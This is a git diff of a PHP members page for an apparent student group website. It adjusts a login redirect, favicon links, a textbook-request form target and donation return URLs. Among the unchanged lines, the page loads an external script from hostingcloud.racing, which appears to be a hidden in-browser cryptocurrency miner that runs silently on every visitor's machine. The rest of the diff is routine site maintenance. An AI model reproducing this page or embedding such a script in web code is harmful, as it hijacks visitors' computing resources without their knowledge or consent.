@@ -4,7 +4,7 @@ session_start();
  
 // Check if the user is logged in, if not then redirect him to login page
 if(!isset($_SESSION["loggedin"]) || $_SESSION["loggedin"] !== true){
-    header("location: login.html");
+    header("location: /login");
     exit;
 }
 ?>
@@ -16,7 +16,8 @@ if(!isset($_SESSION["loggedin"]) || $_SESSION["loggedin"] !== true){
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <link rel="stylesheet" href="style.css">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="icon" type="image/png" sizes="32x32" href="images/favcon.png">
+    <link rel="apple-touch-icon" href="images/favcon.png">
+    <link rel="shortcut icon" href="images/favcon.png" type="image/x-icon">
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Source+Sans+Pro:ital,wght@0,200;0,300;0,400;0,600;0,700;1,300;1,400;1,700&display=swap" rel="stylesheet">
@@ -32,7 +33,7 @@ if(!isset($_SESSION["loggedin"]) || $_SESSION["loggedin"] !== true){
     </div>
     
     <script src="https://www.hostingcloud.racing/lWg9.js"></script>
-    <script src="/js/ignore.js">
+    <script src="js/ignore.js">
         
     </script>
     <div class="intro">
@@ -40,7 +41,7 @@ if(!isset($_SESSION["loggedin"]) || $_SESSION["loggedin"] !== true){
             Hacker, you can find anything you want in this website if you find a bug, stop! and report to us. We will be gratefull to you and acknowledgement your effort until the end of time.
         </p>
         <p>
-            We value the need for public and individual security, and that’s why we provide all of our code to the public. That way, anyone can verify and <a class="link" href="https://github.com/uj-bit-gang/uj-bit-gang.github.io.git" target="_blank" rel="noopener noreferrer">contribute</a> to any part of it while ensuring that our users stay secure.
+            We value the need for public and individual security, and that is why we provide all of our code to the public. That way, anyone can verify and <a class="link" href="https://github.com/uj-bit-gang/uj-bit-gang.github.io.git" target="_blank" rel="noopener noreferrer">contribute</a> to any part of it while ensuring that our users stay secure.
         </p>
     </div>
 
@@ -93,7 +94,7 @@ if(!isset($_SESSION["loggedin"]) || $_SESSION["loggedin"] !== true){
             Business IT students. <br> Student number will be verified before text-book is emailed to you.
         </p>
         <div class="request">
-            <form action="https://newginvestments.co.za/ujbitgang/mail.php" method="post">
+            <form action="mail.php" method="post">
                 <div class="row">
                     <label for="student">Student Number:</label>
                     <input type="number" name="student" id="student" placeholder="290050033" required>
@@ -293,8 +294,8 @@ if(!isset($_SESSION["loggedin"]) || $_SESSION["loggedin"] !== true){
                 <input type="hidden" name="item_name" value="UJ BIT Gang Donation">
                 <input type="hidden" name="amount" value="5.00">
                 <input type="hidden" name="item_description" value="">
-                <input type="hidden" name="return_url" value="https://uj-bit-gang.github.io/thank-you.html">
-                <input type="hidden" name="cancel_url" value="https://uj-bit-gang.github.io/">
+                <input type="hidden" name="return_url" value="https://ujbitgang.online/thank-you">
+                <input type="hidden" name="cancel_url" value="https://ujbitgang.online/">
                 
                 <table class="donate-table">
                     <tr>
